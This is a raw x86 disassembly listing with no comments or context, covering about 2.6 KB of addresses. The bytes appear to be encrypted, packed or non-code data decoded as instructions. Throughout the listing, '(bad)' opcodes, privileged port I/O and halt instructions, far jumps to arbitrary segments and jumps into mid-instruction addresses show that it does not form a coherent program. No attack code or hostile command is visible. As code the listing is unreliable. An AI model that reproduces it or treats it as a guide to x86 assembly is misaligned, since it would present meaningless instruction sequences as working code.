  42424c:	and    ah,BYTE PTR [ebx-0x80]
  42424f:	int3   
  424250:	adc    esi,0xffffffc0
  424253:	inc    ecx
  424254:	icebp  
  424255:	dec    ebp
  424256:	ja     0x424215
  424258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424259:	push   ebx
  42425a:	lea    eax,[edx+0x1a237629]
  424260:	xchg   ebx,eax
  424261:	ret    0x9be0
  424264:	add    edx,DWORD PTR [eax-0x54cf8fac]
  42426a:	ret    
  42426b:	add    eax,DWORD PTR [ecx+0x1f]
  42426e:	dec    ebx
  42426f:	and    al,0xe4
  424271:	ror    BYTE PTR [edi+0x4a4d674],0xcc
  424278:	mov    ch,0xfa
  42427a:	and    ecx,DWORD PTR [edi-0x7e5221fc]
  424280:	add    eax,0x47f367bd
  424285:	xor    dh,BYTE PTR [ebx]
  424287:	fwait
  424288:	and    BYTE PTR [edi-0x47],bl
  42428b:	mov    eax,0xcb675fa
  424290:	jg     0x42424b
  424292:	mul    BYTE PTR [edi]
  424294:	fwait
  424295:	pop    ds
  424296:	jnp    0x424275
  424298:	ficomp DWORD PTR [edx-0x53636eb8]
  42429e:	div    DWORD PTR [edi]
  4242a0:	push   cs
  4242a1:	inc    esp
  4242a2:	xchg   esi,eax
  4242a3:	loope  0x42428f
  4242a5:	cmc    
  4242a6:	hlt    
  4242a7:	jge    0x4242af
  4242a9:	out    dx,al
  4242aa:	xchg   esi,eax
  4242ab:	loop   0x424308
  4242ad:	push   eax
  4242ae:	enter  0xae0a,0x7
  4242b2:	popf   
  4242b3:	add    eax,0x4c4347f6
  4242b8:	or     BYTE PTR [ecx+0x253ec724],dh
  4242be:	inc    esp
  4242bf:	push   esi
  4242c0:	inc    edx
  4242c1:	test   BYTE PTR [edi],dl
  4242c3:	xlat   BYTE PTR ds:[ebx]
  4242c4:	mov    esi,0x108a6775
  4242c9:	add    al,0xcf
  4242cb:	dec    ecx
  4242cc:	adc    eax,DWORD PTR [ecx+0x3b]
  4242cf:	hlt    
  4242d0:	sub    dl,BYTE PTR [ebx+0x73]
  4242d3:	aas    
  4242d4:	inc    ebx
  4242d5:	sahf   
  4242d6:	xlat   BYTE PTR ds:[ebx]
  4242d7:	(bad)  
  4242d8:	or     ebp,DWORD PTR [eax-0x40bd66f7]
  4242de:	in     al,0xe6
  4242e0:	jle    0x424279
  4242e2:	(bad)  
  4242e3:	adc    DWORD PTR [edi+0x238ba6f7],edi
  4242e9:	or     ecx,eax
  4242eb:	cdq    
  4242ec:	mov    esp,0x3f41d9f6
  4242f1:	in     al,dx
  4242f2:	lock cs mov dl,0x38
  4242f6:	xchg   edx,eax
  4242f7:	repz add dl,BYTE PTR [edx]
  4242fa:	mov    ch,0xe8
  4242fc:	adc    BYTE PTR [esi-0xbb6e43],0xcb
  424303:	or     al,0x25
  424305:	loop   0x424323
  424307:	or     BYTE PTR [ebx],cl
  424309:	mov    ebx,0x6eea25e2
  42430e:	out    0x84,eax
  424310:	mov    ebx,0xdd5b2d2c
  424315:	lods   eax,DWORD PTR ds:[esi]
  424316:	jmp    0xbadf:0xe37343ea
  42431d:	jae    0x4242e7
  42431f:	mov    ah,0x93
  424321:	(bad)  
  424322:	mov    esp,0x8db34fa6
  424327:	xchg   edi,eax
  424328:	jl     0x424379
  42432a:	ficomp WORD PTR [ecx-0x32]
  42432d:	call   0x5351:0xd9a7de19
  424334:	retf   
	...
  424395:	add    BYTE PTR [edx-0x24582da],cl
  42439b:	sti    
  42439c:	iret   
  42439d:	test   DWORD PTR ss:[ebx],ebx
  4243a0:	sub    edx,ebp
  4243a2:	push   ebp
  4243a3:	sub    ah,dl
  4243a5:	(bad)  
  4243a6:	scas   eax,DWORD PTR es:[edi]
  4243a7:	add    DWORD PTR [ecx],0x10700
  4243ad:	add    BYTE PTR [eax+0x1545c805],dl
  4243b3:	push   esi
  4243b4:	xchg   bp,ax
  4243b6:	out    dx,al
  4243b7:	adc    ch,BYTE PTR [ecx-0x4e]
  4243ba:	test   al,0xba
  4243bc:	ss sbb eax,0x4383d3fb
  4243c2:	push   ecx
  4243c3:	cmp    DWORD PTR [ebx+0x1a],esi
  4243c6:	mov    ah,0xc2
  4243c8:	arpl   WORD PTR ds:0xe86c2653,ax
  4243ce:	ret    
  4243cf:	and    ebx,0x46224aed
  4243d5:	sub    eax,0x554e9fd1
  4243da:	add    dl,BYTE PTR [eax+0x375429f]
  4243e0:	ror    al,1
  4243e2:	inc    eax
  4243e3:	sbb    dl,bl
  4243e5:	fsub   DWORD PTR [eax]
  4243e7:	es cmc 
  4243e9:	ret    
  4243ea:	lock adc eax,0x28d872f6
  4243f0:	inc    ecx
  4243f1:	shr    ah,0x77
  4243f4:	jo     0x424447
  4243f6:	dec    ecx
  4243f7:	rcr    DWORD PTR [eax+0x64ceab7d],1
  4243fd:	(bad)  
  4243fe:	jns    0x4243e1
  424400:	scas   ax,WORD PTR es:[edi]
  424402:	xchg   ebx,eax
  424403:	(bad)  
  424404:	push   eax
  424405:	ret    0xa87d
  424408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424409:	imul   esp,DWORD PTR [edx],0xca592059
  42440f:	(bad)  
  424410:	mov    bh,0x9a
  424412:	cld    
  424413:	(bad)  
  424414:	push   edi
  424415:	pop    edi
  424416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424417:	mov    BYTE PTR [ecx-0x62],cl
  42441a:	push   esi
  42441b:	test   DWORD PTR [edx],0xcb0441f8
  424421:	push   esi
  424422:	dec    ebx
  424423:	fwait
  424424:	not    ecx
  424426:	pop    ds
  424427:	cmp    eax,0xb283b4bb
  42442c:	or     al,0xf6
  42442e:	or     ebx,DWORD PTR [ecx+0x34]
  424431:	mov    al,ds:0x4301ce12
  424436:	add    edi,ebp
  424438:	in     eax,dx
  424439:	sub    BYTE PTR [ebx+0x312d7756],dl
  42443f:	or     esp,0x13
  424442:	fwait
  424443:	sbb    eax,0x422d9022
  424448:	stos   DWORD PTR es:[edi],eax
  424449:	inc    esp
  42444a:	cmp    al,BYTE PTR [edx+0x45761c4]
  424450:	pop    ebp
  424451:	add    BYTE PTR [ecx-0x4403025c],al
  424457:	cs hlt 
  424459:	mov    bh,0x89
  42445b:	xchg   ebx,eax
  42445c:	hlt    
  42445d:	push   0x70
  42445f:	adc    BYTE PTR [eax+0x6c7e5c0b],ch
  424465:	mov    ebp,0x519655b
  42446a:	dec    ecx
  42446b:	mov    cl,0x96
  42446d:	ret    
  42446e:	adc    al,0xae
  424470:	xchg   ebp,eax
  424471:	lds    ecx,FWORD PTR [ebx]
  424473:	data16 jle 0x42447e
  424476:	push   0x68958ee9
  42447b:	dec    ebp
  42447c:	out    0xf,al
  42447e:	pop    esi
  42447f:	mov    dl,0x5c
  424481:	xchg   ebp,eax
  424482:	jo     0x4244a0
  424484:	mov    dh,0x12
  424486:	mov    cl,0xe5
  424488:	cld    
  424489:	pusha  
  42448a:	mov    cl,0xd8
  42448c:	stos   BYTE PTR es:[edi],al
  42448d:	mov    al,0x35
  42448f:	dec    edx
  424490:	ins    BYTE PTR es:[edi],dx
  424491:	mov    WORD PTR [esi-0x769dcf9a],cs
  424497:	and    BYTE PTR [eax-0x10],dl
  42449a:	xchg   edi,eax
  42449b:	loopne 0x42446b
  42449d:	imul   ecx,DWORD PTR [eax-0x1506cde5],0xffffff93
  4244a4:	stc    
  4244a5:	adc    esp,DWORD PTR [ecx-0x7f693ef1]
  4244ab:	cmovns ebx,DWORD PTR [edx]
  4244ae:	jb     0x4244f3
  4244b0:	loope  0x4244eb
  4244b2:	icebp  
  4244b3:	std    
  4244b4:	push   esp
	...
  424515:	add    al,ah
  424517:	outs   dx,DWORD PTR ds:[esi]
  424518:	xchg   esi,eax
  424519:	inc    edx
  42451a:	lahf   
  42451b:	sti    
  42451c:	hlt    
  42451d:	out    dx,eax
  42451e:	mov    al,ds:0xa30ff3ab
  424523:	das    
  424524:	jmp    0x700:0x182b64c
  42452b:	add    DWORD PTR [eax],eax
  42452d:	add    BYTE PTR ds:0xc6fd1c1c,cl
  424533:	jecxz  0x4244e9
  424535:	cmp    ecx,ebx
  424537:	(bad)  
  424538:	mov    WORD PTR [ebx-0x8f491b4],ss
  42453e:	sahf   
  42453f:	stc    
  424540:	xchg   bh,dh
  424542:	(bad)  
  424543:	nop
  424544:	sub    eax,0x696e8711
  424549:	add    ebp,eax
  42454b:	repnz push ds
  42454d:	ins    BYTE PTR es:[edi],dx
  42454e:	hlt    
  42454f:	add    ebp,eax
  424551:	jns    0x424585
  424553:	sub    ch,BYTE PTR [edx+0x2d]
  424556:	call   0xc53c:0xe1138e14
  42455d:	stc    
  42455e:	xor    eax,0x26ab4260
  424563:	ja     0x424508
  424565:	jno    0x4245c7
  424567:	dec    esp
  424568:	and    al,0x3a
  42456a:	pop    edx
  42456b:	aam    0xd8
  42456d:	out    dx,al
  42456e:	inc    eax
  42456f:	xor    DWORD PTR [esi+edx*4],edi
  424572:	mov    bl,0x3e
  424574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424575:	push   0xffffffec
  424577:	dec    edi
  424578:	jl     0x42456b
  42457a:	aaa    
  42457b:	int    0xb0
  42457d:	and    DWORD PTR [eax],0x4a
  424580:	(bad)  
  424581:	push   ecx
  424582:	aam    0xee
  424584:	test   BYTE PTR [edx],0x8
  424587:	pushf  
  424588:	xchg   edx,eax
  424589:	mov    DWORD PTR [eax-0x36],ecx
  42458c:	mov    bh,0x72
  42458e:	dec    ecx
  42458f:	popf   
  424590:	dec    edx
  424591:	push   cs
  424592:	jmp    0xea4954d9
  424597:	pop    ebx
  424598:	ds daa 
  42459a:	aas    
  42459b:	sbb    dl,dl
  42459d:	jno    0x4245b5
  42459f:	jmp    0x55ff305b
  4245a4:	xor    al,0x95
  4245a6:	pushf  
  4245a7:	xor    al,0x8b
  4245a9:	push   0xffffffe6
  4245ab:	cwde   
  4245ac:	and    edi,ebp
  4245ae:	jmp    0x424607
  4245b0:	pop    es
  4245b1:	out    0x13,eax
  4245b3:	mov    BYTE PTR [ebp+0x53a3eaf9],ah
  4245b9:	gs sbb eax,0xa7be905
  4245bf:	adc    al,0x5a
  4245c1:	nop
  4245c2:	(bad)  
  4245c3:	fst    DWORD PTR [edx]
  4245c5:	ds gs jmp 0x633cf0bf
  4245cc:	aas    
  4245cd:	imul   esp,DWORD PTR [edx-0x1a],0x66
  4245d1:	sbb    al,0x97
  4245d3:	hlt    
  4245d4:	jns    0x4245cb
  4245d6:	out    dx,eax
  4245d7:	fcomi  st,st(5)
  4245d9:	mov    bl,0x86
  4245db:	jge    0x424607
  4245dd:	pop    eax
  4245de:	xor    ebx,DWORD PTR [edi-0x7bc368d7]
  4245e4:	lds    esp,FWORD PTR [edx+esi*2]
  4245e7:	cli    
  4245e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245e9:	xchg   edi,eax
  4245ea:	push   0x38
  4245ec:	and    BYTE PTR [edx-0x27],ah
  4245ef:	mov    bh,BYTE PTR [edx-0x21]
  4245f2:	nop
  4245f3:	les    edi,FWORD PTR [ecx]
  4245f5:	mov    ah,0x75
  4245f7:	(bad)  
  4245f8:	sbb    al,0x64
  4245fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245fb:	jbe    0x424649
  4245fd:	pop    ebp
  4245fe:	sub    BYTE PTR [eax-0x499ab1a3],ah
  424604:	push   ebx
  424605:	arpl   WORD PTR [edx-0x662912a3],cx
  42460b:	sub    al,0xa7
  42460d:	xor    DWORD PTR ds:0xcb7e6bce,0x57a6b476
  424617:	mov    bh,0x2d
  424619:	cmp    edx,DWORD PTR [esi+0x2d]
  42461c:	push   0x8c7db16c
  424621:	jecxz  0x42464e
  424623:	rcr    BYTE PTR [eax-0x4a],1
  424626:	in     al,0x5c
  424628:	jmp    0x424611
  42462a:	adc    DWORD PTR [ebx+esi*2-0x5f7db461],esp
  424631:	loope  0x4245ba
  424633:	pop    es
  424634:	cld    
	...
  424695:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42469c:	mov    edi,0x8f38d4d3
  4246a1:	cmp    edi,DWORD PTR [esi-0x428f843e]
  4246a7:	add    DWORD PTR [ecx],0x0
  4246aa:	pop    es
  4246ab:	add    DWORD PTR [eax],eax
  4246ad:	add    BYTE PTR ds:0x192a448e,ch
  4246b3:	out    dx,eax
  4246b4:	std    
  4246b5:	jg     0x424689
  4246b7:	jg     0x4246e0
  4246b9:	jnp    0x42469f
  4246bb:	sbb    eax,0xc521d19a
  4246c0:	sbb    DWORD PTR [esi+ebx*4+0x2d5d4dd6],ebp
  4246c7:	lods   al,BYTE PTR ds:[esi]
  4246c8:	and    eax,DWORD PTR [ecx+0x8]
  4246cb:	leave  
  4246cc:	sub    DWORD PTR [eax],0x33
  4246cf:	sbb    edx,DWORD PTR [esi]
  4246d1:	test   eax,0x34e7cd75
  4246d6:	lahf   
  4246d7:	mov    WORD PTR [ebp+0x56],cs
  4246da:	jl     0x424751
  4246dc:	fcom   QWORD PTR ds:0x75114d0a
  4246e2:	adc    al,0x17
  4246e4:	pushf  
  4246e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246e6:	outs   dx,BYTE PTR ds:[esi]
  4246e7:	shl    BYTE PTR [edx+0x1f],cl
  4246ea:	out    dx,eax
  4246eb:	push   esi
  4246ec:	inc    ebx
  4246ed:	mov    edi,0xd57bd5a2
  4246f2:	pop    ss
  4246f3:	dec    esp
  4246f4:	xor    eax,0x7da75050
  4246f9:	xor    eax,0xe2095a95
  4246fe:	rcl    ah,0x5d
  424701:	jns    0x424699
  424703:	dec    esp
  424704:	inc    ebp
  424705:	setae  cl
  424708:	std    
  424709:	sub    DWORD PTR [ebx+0x78],esi
  42470c:	out    dx,al
  42470d:	out    0x12,eax
  42470f:	jbe    0x4246cd
  424711:	push   ebx
  424712:	rcr    DWORD PTR [eax],0x0
  424715:	aaa    
  424716:	sub    al,BYTE PTR [edi]
  424718:	(bad)  
  424719:	jnp    0x4246c3
  42471b:	pop    edi
  42471c:	push   edx
  42471d:	out    0xcb,eax
  42471f:	xor    cl,ch
  424721:	dec    ecx
  424722:	dec    edi
  424723:	or     al,0x23
  424725:	pop    esi
  424726:	adc    DWORD PTR [ecx],edx
  424728:	sbb    al,0x3b
  42472a:	pop    ss
  42472b:	pop    ebx
  42472c:	sub    cl,BYTE PTR [ecx+0x7cf0e8f0]
  424732:	retf   0x2e9e
  424735:	bound  edx,QWORD PTR [edi-0x52]
  424738:	lods   eax,DWORD PTR ds:[esi]
  424739:	jmp    0xb877:0xc93ad7bc
  424740:	out    0xe9,al
  424742:	sar    BYTE PTR [ebp+0x2dcd2667],1
  424748:	(bad)  
  42474a:	push   es
  42474b:	arpl   WORD PTR [eax+ebx*1],bx
  42474e:	pop    eax
  42474f:	xchg   BYTE PTR [edi],ch
  424751:	jg     0x42474a
  424753:	mov    bh,0xd1
  424755:	add    eax,0x32be0531
  42475a:	lea    edx,[eax]
  42475c:	push   ecx
  42475d:	dec    esi
  42475e:	arpl   bp,bp
  424760:	add    eax,0xe3b371d
  424765:	ss je  0x4247d2
  424768:	lahf   
  424769:	shr    cl,0x69
  42476c:	add    ch,BYTE PTR [edi+0xb0f34ee]
  424772:	mov    WORD PTR [esi+ebp*8+0x46dec1e0],cs
  424779:	cmp    BYTE PTR [ecx+0x2482ebac],dl
  42477f:	out    dx,eax
  424780:	pop    eax
  424781:	sub    ch,ch
  424783:	jb     0x42478c
  424785:	gs aad 0x2
  424788:	rcr    DWORD PTR [ebp+ebx*2+0xac4f38c],cl
  42478f:	or     al,0x6e
  424791:	and    eax,0xa9e33df3
  424796:	pusha  
  424797:	(bad)  
  424798:	adc    ch,BYTE PTR ds:0xdeb1e732
  42479e:	push   cs
  42479f:	nop
  4247a0:	sahf   
  4247a1:	inc    ecx
  4247a2:	mul    edi
  4247a4:	inc    eax
  4247a5:	cwde   
  4247a6:	inc    ecx
  4247a7:	cmp    eax,0xf2d10b48
  4247ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247ad:	push   es
  4247ae:	sub    al,0x4c
  4247b0:	add    al,0xe3
  4247b2:	dec    ebp
  4247b3:	rcl    BYTE PTR [ecx],1
	...
  424815:	add    BYTE PTR [edx],ah
  424817:	pop    eax
  424818:	test   bh,ch
  42481a:	(bad)  
  42481b:	jmp    FWORD PTR [ebx-0x23]
  42481e:	rol    DWORD PTR [eax-0x4a9507de],0xf1
  424825:	daa    
  424826:	les    eax,FWORD PTR [ecx+eax*1+0x10700]
  42482d:	add    BYTE PTR [edi+0x5cb3c16b],ch
  424833:	xchg   edx,eax
  424834:	xchg   ebx,eax
  424835:	push   esp
  424836:	in     al,dx
  424837:	dec    edx
  424838:	push   esi
  424839:	popf   
  42483a:	push   DWORD PTR [ebx]
  42483c:	mov    dl,0xb7
  42483e:	or     DWORD PTR [esi-0x3f25ebff],0xffffff93
  424845:	push   ecx
  424846:	sti    
  424847:	stos   DWORD PTR es:[edi],eax
  424848:	ret    0xf84a
  42484b:	lahf   
  42484c:	out    dx,eax
  42484d:	cmp    bl,al
  42484f:	arpl   WORD PTR [edx-0x1e623c2d],cx
  424855:	xchg   BYTE PTR [ecx+0x34],bh
  424858:	outs   dx,DWORD PTR ds:[esi]
  424859:	adc    dh,BYTE PTR [ebx+ecx*1-0x67d735aa]
  424860:	xlat   BYTE PTR ds:[ebx]
  424861:	in     eax,0xa7
  424863:	mov    eax,?
  424865:	xor    edx,ebx
  424867:	les    edx,FWORD PTR [eax-0x3b]
  42486a:	icebp  
  42486b:	cmp    DWORD PTR [ebx+0x14aaeefe],eax
  424871:	inc    ecx
  424872:	mov    ds:0xe5209628,eax
  424877:	repz dec edx
  424879:	pop    ebx
  42487a:	rcr    edx,1
  42487c:	fisub  DWORD PTR [edi]
  42487e:	xor    DWORD PTR [ebx+0x3095e455],eax
  424884:	lahf   
  424885:	test   al,0xad
  424887:	jmp    0xd9cecc63
  42488c:	adc    DWORD PTR [ecx],ecx
  42488e:	jno    0x42490a
  424890:	jo     0x42489f
  424892:	jno    0x42488c
  424894:	and    eax,DWORD PTR [esi]
  424896:	push   eax
  424897:	pop    esi
  424898:	enter  0x908e,0xb2
  42489c:	std    
  42489d:	sub    DWORD PTR [esi+0x59],eax
  4248a0:	fld    DWORD PTR [ecx+0x0]
  4248a3:	arpl   WORD PTR [eax+0x78],cx
  4248a6:	popa   
  4248a7:	push   0xd5df6653
  4248ac:	push   0xfffffffb
  4248ae:	pop    esi
  4248af:	fs dec esp
  4248b1:	dec    ecx
  4248b2:	sbb    BYTE PTR [ecx],dl
  4248b4:	pop    ds
  4248b5:	scas   al,BYTE PTR es:[edi]
  4248b6:	popa   
  4248b7:	adc    DWORD PTR [esi],edi
  4248b9:	jne    0x4248de
  4248bb:	mov    ds,WORD PTR [edx]
  4248bd:	ret    0x33c3
  4248c0:	shl    BYTE PTR [edx-0x31cd01cc],0xc6
  4248c7:	or     bh,BYTE PTR [eax+0x3296af79]
  4248cd:	add    eax,0x629b6261
  4248d2:	xchg   ecx,eax
  4248d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248d4:	lds    ecx,FWORD PTR [eax+0x2c]
  4248d7:	outs   dx,BYTE PTR ds:[esi]
  4248d8:	test   eax,ebp
  4248da:	add    al,0x9
  4248dc:	mov    edi,0x4955f425
  4248e1:	dec    esi
  4248e2:	push   ebx
  4248e3:	inc    ecx
  4248e4:	xor    eax,0x4889edbf
  4248e9:	mov    dh,0x7a
  4248eb:	adc    al,0x3c
  4248ed:	xchg   ecx,eax
  4248ee:	imul   edi,DWORD PTR [eax],0xc0fd181
  4248f4:	jno    0x424953
  4248f6:	adc    edi,esi
  4248f8:	bound  edi,QWORD PTR [ecx+0x635f4bce]
  4248fe:	inc    ebp
  4248ff:	dec    eax
  424900:	and    DWORD PTR [eax-0x6b895473],edx
  424906:	or     eax,DWORD PTR [eax+0x232c1ea8]
  42490c:	in     eax,dx
  42490d:	jmp    0x396f8e34
  424912:	cmp    DWORD PTR [ebx],ecx
  424914:	test   BYTE PTR [eax-0x6bd91e53],0x9c
  42491b:	or     eax,DWORD PTR [eax]
  42491d:	xor    ch,dh
  42491f:	fiadd  WORD PTR [edx+ecx*1]
  424922:	add    eax,0x8d853e6
  424927:	in     eax,dx
  424928:	dec    ecx
  424929:	shl    DWORD PTR [edi],1
  42492b:	inc    ecx
  42492c:	iret   
  42492d:	jle    0x424902
  42492f:	pop    ebp
  424930:	loop   0x42497c
  424932:	hlt    
  424933:	out    dx,eax
  424934:	add    BYTE PTR gs:[eax],al
	...
  424993:	add    BYTE PTR [eax],al
  424995:	add    BYTE PTR [ebx+0x18],ch
  424998:	arpl   WORD PTR [edx+0x73],bp
  42499b:	jnp    0x424a08
  42499d:	sbb    ebp,eax
  42499f:	adc    eax,0x349dbac2
  4249a4:	rcl    BYTE PTR [edx-0x35],0x85
  4249a8:	add    DWORD PTR [eax],eax
  4249aa:	pop    es
  4249ab:	add    DWORD PTR [eax],eax
  4249ad:	add    BYTE PTR [ebp+0x31],al
  4249b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249b1:	xchg   esi,eax
  4249b2:	jo     0x4249d9
  4249b4:	xchg   edi,eax
  4249b5:	lods   eax,DWORD PTR ds:[esi]
  4249b6:	jl     0x424a1f
  4249b8:	daa    
  4249b9:	lea    esi,[eax-0x52]
  4249bc:	imul   edi,ecx,0x3b
  4249bf:	data16 ins BYTE PTR es:[edi],dx
  4249c1:	ds push es
  4249c3:	call   0x40703e6c
  4249c8:	loop   0x424a02
  4249ca:	ja     0x4249f8
  4249cc:	gs pop ebp
  4249ce:	lods   al,BYTE PTR ds:[esi]
  4249cf:	add    BYTE PTR [esi+esi*8],al
  4249d2:	mov    eax,0xc88c7011
  4249d7:	into   
  4249d8:	out    0x41,al
  4249da:	adc    ebp,DWORD PTR [eax-0x6309fb5d]
  4249e0:	xchg   esi,eax
  4249e1:	push   cs
  4249e2:	js     0x424a50
  4249e4:	loop   0x4249ff
  4249e6:	lods   eax,DWORD PTR ds:[esi]
  4249e7:	aaa    
  4249e8:	sub    esi,eax
  4249ea:	mov    ebx,0x8e2773de
  4249ef:	xchg   ebp,eax
  4249f0:	call   0x9589:0xfe3c1c05
  4249f7:	sar    BYTE PTR [esi],0x6f
  4249fa:	dec    eax
  4249fb:	dec    edi
  4249fc:	ror    DWORD PTR [esi+0x4c],1
  4249ff:	xor    al,0x5b
  424a01:	retf   
  424a02:	adc    BYTE PTR [esi],ah
  424a04:	mov    bl,0xcf
  424a06:	mov    WORD PTR ds:0xfbac792a,?
  424a0c:	cs jle 0x424a0a
  424a0f:	out    0x5f,al
  424a11:	mov    dh,0x14
  424a13:	sub    ecx,ebx
  424a15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a16:	fisttp WORD PTR [ebp+0x4f]
  424a19:	xchg   ebx,eax
  424a1a:	(bad)  
  424a1b:	cld    
  424a1c:	(bad)  
  424a1e:	loop   0x424a07
  424a20:	lea    esi,[edi*4+0x2c6777aa]
  424a27:	imul   ebx,DWORD PTR [edi],0xfb8c0c27
  424a2d:	mov    esp,0x99684e4e
  424a32:	(bad)  
  424a33:	out    0xc2,eax
  424a35:	arpl   WORD PTR [esi-0x2a],cx
  424a38:	ds add al,0xf1
  424a3b:	dec    eax
  424a3c:	adc    eax,0x81191f2e
  424a41:	ret    0xb69e
  424a44:	aam    0x19
  424a46:	mov    DWORD PTR [edx-0xd277771],0x390671ac
  424a50:	xchg   edi,eax
  424a51:	ins    DWORD PTR es:[edi],dx
  424a52:	int3   
  424a53:	imul   ebp,DWORD PTR [ecx+edx*2-0x4f2d8f94],0xffffffe6
  424a5b:	lock ja 0x4249e5
  424a5e:	push   ebp
  424a5f:	shl    ebp,1
  424a61:	addr16 icebp 
  424a63:	sbb    ecx,DWORD PTR [ecx+0x41ae4250]
  424a69:	outs   dx,BYTE PTR ds:[esi]
  424a6a:	inc    eax
  424a6b:	nop
  424a6c:	push   ss
  424a6d:	push   esp
  424a6e:	mov    BYTE PTR [esi+0x40],bh
  424a71:	cmp    cl,al
  424a73:	nop
  424a74:	stc    
  424a75:	aas    
  424a76:	dec    ebx
  424a77:	enter  0xda91,0x8f
  424a7b:	mov    edi,DWORD PTR [esi-0x43]
  424a7e:	cld    
  424a7f:	idiv   dh
  424a81:	sti    
  424a82:	leave  
  424a83:	in     al,0xa1
  424a85:	dec    esi
  424a86:	pop    ds
  424a87:	fwait
  424a88:	mov    ah,0x1d
  424a8a:	cmp    ebp,ebx
  424a8c:	add    DWORD PTR [eax-0x65],0x341166b4
  424a93:	test   ch,0x1b
  424a96:	mov    ch,0xbc
  424a98:	sahf   
  424a99:	stc    
  424a9a:	ins    DWORD PTR es:[edi],dx
  424a9b:	fmul   DWORD PTR [edi+0x193ac510]
  424aa1:	gs fadd st(3),st
  424aa4:	call   0x69a3:0x107da6cf
  424aab:	mov    ecx,0x15b1540c
  424ab0:	xchg   edi,eax
  424ab1:	xchg   ebx,eax
  424ab2:	pop    es
  424ab3:	xor    al,0x57
	...
  424b15:	add    BYTE PTR [esi],al
  424b17:	aas    
  424b18:	or     eax,0xb6bb3db9
  424b1d:	mov    edi,0x1cbed53b
  424b22:	adc    al,0x8c
  424b24:	or     DWORD PTR [ebp+0x186d2],edx
  424b2a:	pop    es
  424b2b:	add    DWORD PTR [eax],eax
  424b2d:	add    BYTE PTR [eax-0x7c],al
  424b30:	fld    QWORD PTR [ecx]
  424b32:	pop    ecx
  424b33:	ret    
  424b34:	rcl    DWORD PTR [ecx-0x5b5400db],1
  424b3a:	lds    edi,FWORD PTR [ecx+0x9]
  424b3d:	test   DWORD PTR [ebp+0x22],eax
  424b40:	fidivr DWORD PTR [ecx]
  424b42:	cmp    al,dh
  424b44:	or     DWORD PTR [eax-0x58],edi
  424b47:	jge    0x424b68
  424b49:	sub    ch,BYTE PTR [edi]
  424b4b:	push   ecx
  424b4c:	sar    DWORD PTR [ecx+0x517d9f4b],0xdd
  424b53:	test   eax,0x44cbf5dd
  424b58:	mov    ds:0x4a7637a1,eax
  424b5d:	add    esi,DWORD PTR fs:[eax]
  424b60:	scas   al,BYTE PTR es:[edi]
  424b61:	fimul  DWORD PTR [eax]
  424b63:	cmp    BYTE PTR [esi],al
  424b65:	popf   
  424b66:	out    dx,al
  424b67:	cs cmp eax,0x13b3e100
  424b6d:	xor    al,0x6f
  424b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b70:	test   BYTE PTR [ecx],bh
  424b72:	push   ebx
  424b73:	cwde   
  424b74:	mov    edx,0x6a9d5894
  424b79:	out    0x8e,al
  424b7b:	push   fs
  424b7d:	inc    edi
  424b7e:	fmul   DWORD PTR [ecx+edi*1-0x3e171c52]
  424b85:	lea    eax,[ebx+0x78340e9c]
  424b8b:	jbe    0x424b95
  424b8d:	jge    0x424b42
  424b8f:	int    0x2a
  424b91:	fwait
  424b92:	test   eax,0x1ce8835e
  424b97:	div    DWORD PTR [eax+0x4f]
  424b9a:	outs   dx,DWORD PTR ds:[esi]
  424b9b:	adc    al,0x3e
  424b9d:	pop    esp
  424b9e:	out    0x7a,eax
  424ba0:	mov    ds:0xf751697b,al
  424ba5:	xchg   BYTE PTR [ecx],ch
  424ba7:	add    eax,0xff0e50dd
  424bac:	nop
  424bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bae:	or     BYTE PTR ds:0x851d3291,dh
  424bb4:	jg     0x424bf8
  424bb6:	inc    edx
  424bb7:	stos   BYTE PTR es:[edi],al
  424bb8:	adc    esi,DWORD PTR [edi]
  424bba:	(bad)  
  424bbb:	(bad)  
  424bbc:	pop    ds
  424bbd:	sar    DWORD PTR [ecx+0x680f4813],cl
  424bc3:	(bad)  
  424bc4:	dec    esi
  424bc5:	pop    ss
  424bc6:	or     eax,0x897ad23a
  424bcb:	daa    
  424bcc:	or     bh,0x1e
  424bcf:	and    eax,0x6da369cf
  424bd4:	xchg   esi,eax
  424bd5:	mov    BYTE PTR [edx],ah
  424bd7:	pop    edx
  424bd8:	pop    edx
  424bd9:	sbb    ah,dl
  424bdb:	stos   DWORD PTR es:[edi],eax
  424bdc:	jmp    0x424ba4
  424bde:	jno    0x424bee
  424be0:	mov    eax,ds:0x1c1d130
  424be5:	nop
  424be6:	add    cl,BYTE PTR [esi-0x772b5e55]
  424bec:	mov    ebp,0x6dad58e0
  424bf1:	sti    
  424bf2:	jne    0x424c33
  424bf4:	or     DWORD PTR [esi],0x9102d6b4
  424bfa:	jmp    FWORD PTR [edi]
  424bfc:	sbb    edx,eax
  424bfe:	pop    edi
  424bff:	mov    dh,0xc3
  424c01:	or     BYTE PTR [ebp+0x7f43006b],ch
  424c07:	fistp  QWORD PTR [edi]
  424c09:	ret    0xa097
  424c0c:	dec    ebp
  424c0d:	rcl    DWORD PTR [eax-0x7424ebdd],1
  424c13:	iret   
  424c14:	jmp    0x424c59
  424c16:	test   DWORD PTR es:[ecx+esi*1+0x18],edx
  424c1b:	pop    ebp
  424c1c:	and    bh,dh
  424c1e:	pop    ebx
  424c1f:	mov    cl,0x52
  424c21:	xor    ch,bl
  424c23:	sbb    DWORD PTR [ecx],edx
  424c25:	ret    0xb2e3
  424c28:	arpl   bx,si
  424c2a:	sub    DWORD PTR [esi+0xf06c3e3],esp
  424c30:	dec    esp
  424c31:	jl     0x424c96
  424c33:	mov    edi,DWORD PTR [eax+eax*1+0x0]
	...
  424c96:	ins    BYTE PTR es:[edi],dx
  424c97:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
